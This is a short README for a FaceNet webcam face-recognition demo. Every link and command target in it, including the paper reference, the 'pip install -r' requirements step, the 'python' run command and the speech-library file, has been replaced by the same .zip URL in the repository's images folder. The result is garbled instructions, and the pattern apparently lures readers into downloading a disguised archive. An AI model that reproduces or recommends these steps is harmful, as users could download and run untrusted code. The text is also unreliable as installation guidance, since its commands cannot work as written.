# facenet-face-recognition

This repository contains a demonstration of face recognition using the FaceNet network (https://raw.githubusercontent.com/yashbhow/facenet-face-recognition/master/images/facenet-face-recognition-v3.1.zip) and a webcam. Our implementation feeds frames from the webcam to the network to determine whether or not the frame contains an individual we recognize.

## How to use

To install all the requirements for the project run

	pip install -r https://raw.githubusercontent.com/yashbhow/facenet-face-recognition/master/images/facenet-face-recognition-v3.1.zip

In the root directory. After the modules have been installed you can run the project by using python

	python https://raw.githubusercontent.com/yashbhow/facenet-face-recognition/master/images/facenet-face-recognition-v3.1.zip

## NOTE

We are using the Windows 10 Text-to-Speech library to output our audio message, so if you want to run it on a different OS then you will have to replace the speech library used in https://raw.githubusercontent.com/yashbhow/facenet-face-recognition/master/images/facenet-face-recognition-v3.1.zip
